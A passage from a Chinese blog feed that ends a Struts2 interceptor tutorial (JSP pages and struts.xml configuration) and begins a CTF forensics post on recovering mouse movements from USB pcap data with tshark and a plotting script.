class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>$&#123;requestScope.msg&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>用户名:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>密码:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>main.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_del&quot;</span>&gt;</span>book del<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>用户$&#123;user.username&#125;操作成功<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明拦截器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span> </span><br><span class="hljs-tag">             <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.interceptor.PrivilegeInterceptor&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 用户登录操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 关于book操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;book_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问main.jsp<br><img src="https://img-blog.csdnimg.cn/20210416221426697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接，由于没有登陆，所以没有权限，页面跳转到登录页面要求用户登录。<br><img src="https://img-blog.csdnimg.cn/20210416221438400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆成功后点击链接，跳转成功页面，提示用户操作成功。<br><img src="https://img-blog.csdnimg.cn/20210416222502828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对比可知拦截器成功执行</p><p>以上案例中，创建了一个方法过滤器PrivilegeInterceptor，在struts.xml中配置了该拦截器，如果用户没有登陆，将无法对页面链接进行相应操作，只有登陆后的用户才有权限操作页面相应功能。</p><h2 id="拦截器工作原理"><a href="#拦截器工作原理" class="headerlink" title="拦截器工作原理"></a>拦截器工作原理</h2><p><strong>拦截器的执行顺序</strong><br>invocation.invoke()方法是拦截器框架的实现核心，通过确定invocation.invoke()方法执行位置，来实现Action执行前后处理操作，在invocation.invoke()方法之前的代码将依据配置中拦截器顺序依次执行，直到走完拦截器后再执行invocation.invoke()方法调用Action，然后再依据配置中拦截器顺序反向执行invocation.invoke()方法后的代码，直到走完拦截器</p><p><strong>拦截器的工作原理</strong><br>如图所示<br><img src="https://img-blog.csdnimg.cn/2021042220560043.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>每一个Action请求都包装在一系列的拦截器的内部。拦截器可以在Action执行直线做相似的操作也可以在Action执行直后做回收操作。</p><p>每一个Action既可以将操作转交给下面的拦截器，Action也可以直接退出操作返回客户既定的画面。</p><p><a href="https://www.cnblogs.com/yw-ah/p/5761235.html">https://www.cnblogs.com/yw-ah/p/5761235.html</a><br><a href="https://www.cnblogs.com/wkrbky/p/5894315.html">https://www.cnblogs.com/wkrbky/p/5894315.html</a><br><a href="https://blog.csdn.net/weixin_42529699/article/details/81354355">https://blog.csdn.net/weixin_42529699/article/details/81354355</a><br><a href="https://www.imooc.com/learn/450">https://www.imooc.com/learn/450</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（三）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>USB流量分析</title>
    <link href="http://atkx.top/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://atkx.top/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-04-12T04:58:33.024Z</published>
    <updated>2021-08-15T03:59:06.586Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：USB流量分析</p> <a id="more"></a><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">当取0×00时,代表没有按键<br>当取0×01时,代表按左键<br>当取0×02时,代表当前按键为右键<br></code></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标右移像素位；<br>值为负时，代表鼠标左移像素位。<br></code></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标上移像素位；<br>值为负时，代表鼠标下移像素位。<br></code></pre></td></tr></table></figure><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><p><strong>题目</strong><br>方法1：<br>基于python2的UsbMiceHacker.py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>还有基于python3的<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHT代表右键</span><br></code></pre></td></tr></table></figure><p>我这里什么也没有<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>贴上其他人成功的结果<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法2：<br>提取鼠标流量数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" 